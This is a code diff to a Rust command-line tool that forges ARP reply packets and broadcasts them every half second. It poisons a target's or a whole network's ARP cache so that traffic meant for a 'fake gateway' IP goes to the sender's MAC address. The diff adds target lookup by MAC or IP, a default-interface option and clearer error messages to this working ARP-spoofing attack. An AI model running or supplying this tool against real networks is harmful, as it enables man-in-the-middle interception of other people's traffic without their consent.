@@ -48,6 +48,10 @@ struct Args {
 
     #[arg(short, long)]
     list: bool,
+
+    #[arg(long)]
+    get_default_interface: bool,
+
     host: Option<String>,
 }
 
@@ -57,42 +61,65 @@ fn main() {
         list_interfaces();
         exit(0);
     }
+
+    if args.get_default_interface {
+        let interface = get_default_interface().expect("No default interface found.");
+        println!("{}", interface.name);
+        exit(0);
+    }
+
+
+
     let interface = match args.interface {
         Some(u) => get_interface(&u),
         None => get_default_interface(),
     }
-    .unwrap();
+    .expect("No proper interface found.");
+    let target_ip;
 
-    let mut client = ArpClient::new_with_iface_name(&interface.name).unwrap();
+    let mut client = ArpClient::new_with_iface_name(&interface.name).expect("Failed to create ARP client.");
     let dest = match args.target {
-        Some(ref u) => {
-            let result = client.ip_to_mac(Ipv4Addr::from_str(&u).unwrap(), None);
-            result.unwrap().into()
-        }
-        None => MacAddr::broadcast(),
+        Some(ref u) => match MacAddr::from_str(&u) {
+            Ok(mac) => {
+                target_ip = client
+                    .mac_to_ip(mac.into(), Some(std::time::Duration::from_secs(5)))
+                    .expect("Get target ip by mac failed.");
+                mac
+            }
+            Err(_) => {
+                target_ip = Ipv4Addr::from_str(u).expect("Target is not Mac or IP.");
+                let result = client.ip_to_mac(target_ip, None);
+                result.expect("Get target mac by ip failed.").into()
+            }
+        },
+        None => {
+            target_ip = Ipv4Addr::BROADCAST;
+            MacAddr::broadcast()
+        },
     };
-
-    let target_ip = Ipv4Addr::from_str(&args.target.unwrap_or(String::from("0.0.0.0"))).unwrap();
-    let host = Ipv4Addr::from_str(&args.host.expect("Host ip needed.")).expect("Invalid host IP address");
-    let my_mac = interface.mac.expect("No MAC address found for the interface");
+    let gateway = Ipv4Addr::from_str(&args.host.expect("Fake gateway ip needed."))
+        .expect("Invalid fake gateway IP address");
+    let my_mac = interface
+        .mac
+        .expect("No MAC address found for the interface");
 
     println!("Targe: {:#?}", dest);
     println!("Interface: {}", interface.name);
-    let (mut sender, mut receiver) = match channel(&interface, Config::default()) {
+    let (mut sender, _receiver) = match channel(&interface, Config::default()) {
         Ok(Channel::Ethernet(tx, rx)) => (tx, rx),
         Ok(_) => panic!("Unknown channel type"),
         Err(e) => panic!("Error happened {}", e),
     };
 
     let mut ethernet_buffer = [0u8; 42];
-    let mut ethernet_packet = MutableEthernetPacket::new(&mut ethernet_buffer).unwrap();
+    let mut ethernet_packet = MutableEthernetPacket::new(&mut ethernet_buffer).expect("Failed to create ethernet packet.");;
 
     ethernet_packet.set_destination(MacAddr::broadcast());
-    ethernet_packet.set_source(interface.mac.unwrap());
+    ethernet_packet.set_source(interface.mac.expect("No MAC address found for the interface"));
     ethernet_packet.set_ethertype(EtherTypes::Arp);
 
     let mut arp_buffer = [0u8; 28];
-    let mut arp_packet = MutableArpPacket::new(&mut arp_buffer).unwrap();
+    let mut arp_packet = MutableArpPacket::new(&mut arp_buffer).expect("Failed to create ARP packet.");
 
     arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
     arp_packet.set_protocol_type(EtherTypes::Ipv4);
@@ -100,7 +127,7 @@ fn main() {
     arp_packet.set_proto_addr_len(4);
     arp_packet.set_operation(ArpOperations::Reply);
     arp_packet.set_sender_hw_addr(my_mac);
-    arp_packet.set_sender_proto_addr(host);
+    arp_packet.set_sender_proto_addr(gateway);
     arp_packet.set_target_hw_addr(dest);
     arp_packet.set_target_proto_addr(target_ip);
 
@@ -109,8 +136,7 @@ fn main() {
     loop {
         sender
             .send_to(ethernet_packet.packet(), None)
-            .unwrap()
-            .unwrap();
+            .expect("Failed to send packet.").unwrap();
         println!("{:#?}", arp_packet);
         std::thread::sleep(std::time::Duration::from_millis(500));
     }
